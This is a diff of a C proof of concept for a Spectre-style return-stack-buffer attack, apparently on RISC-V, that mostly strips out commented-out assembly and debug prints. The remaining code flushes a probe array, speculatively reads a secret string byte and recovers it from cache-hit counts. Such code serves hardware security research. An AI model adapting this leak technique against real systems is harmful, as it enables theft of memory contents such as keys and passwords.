@@ -38,40 +38,16 @@ void topTwoIdx(uint64_t* inArray, uint64_t inArraySize, uint8_t* outIdxArray, ui
     }
 }
 
-/*void frameDump1(){
-    asm volatile(
-        "ld ra, 40(sp)\n"
-	"ld s0, 32(sp)\n"
-        "addi sp, sp, 48\n"
-
-        "addi ra, ra, -2\n"
-        "addi t1, zero, 2\n"
-        "slli t2, t1, 0x4\n"
-        "fcvt.s.lu fa4, t1\n"
-        "fcvt.s.lu fa5, t2\n"
-        "fdiv.s fa5, fa5, fa4\n"
-        "fdiv.s fa5, fa5, fa4\n"
-        "fdiv.s fa5, fa5, fa4\n"
-	"fdiv.s fa5, fa5, fa4\n"
-        "fcvt.lu.s t2, fa5, rtz\n"
-        "add ra, ra, t2\n"
-
-	"ret\n");
-}*/
-
 /**
  * function to read in the attack array given an attack address to read in. it does this speculatively by bypassing the RSB
  *
  * @input addr passed in address to read from
  */
-//uint64_t dummy1 = 0;
-//extern void frameDump();
 void specFunc(uint64_t addr){
     extern void frameDump();
     uint64_t dummy = 0;
     frameDump();
     dummy = attackArray[(*((uint8_t*)addr)) * L1_BLOCK_SZ_BYTES]; 
-    //dummy1 = rdcycle();
 }
 
 int main(void){
@@ -85,26 +61,18 @@ int main(void){
         for(uint64_t cIdx = 0; cIdx < 256; ++cIdx){
             results[cIdx] = 0;
         }
-
         // run the attack on the same idx ATTACK_SAME_ROUNDS times
         for(uint64_t atkRound = 0; atkRound < ATTACK_SAME_ROUNDS; ++atkRound){
-
-            //printf("start attack\n");
-
             // flush the array that will be probed
             flushCache((uint64_t)attackArray, sizeof(attackArray));
 
-            //printf("flushed attackarray\n");
-	     for(uint64_t k=0;k<50;k++){
+	    for(uint64_t k=0;k<50;k++){
 	        asm("");
 	    }
 
             // run the particular attack sequence
             specFunc((uint64_t)secretString + offset);
               
-	   // for(uint64_t k=0;k<50;k++){
-		               //      asm("");
-				//        }
 	    asm volatile("ld s0,-16(sp)\n");
             // read out array 2 and see the hit secret value
             // this is also assuming there is no prefetching
@@ -116,11 +84,7 @@ int main(void){
                     results[i] += 1;
                 }
             }
-
-            //printf("finished results\n");
         }
-
-        //printf("finished rounds\n");
 
         uint8_t output[2];
         uint64_t hitArray[2];
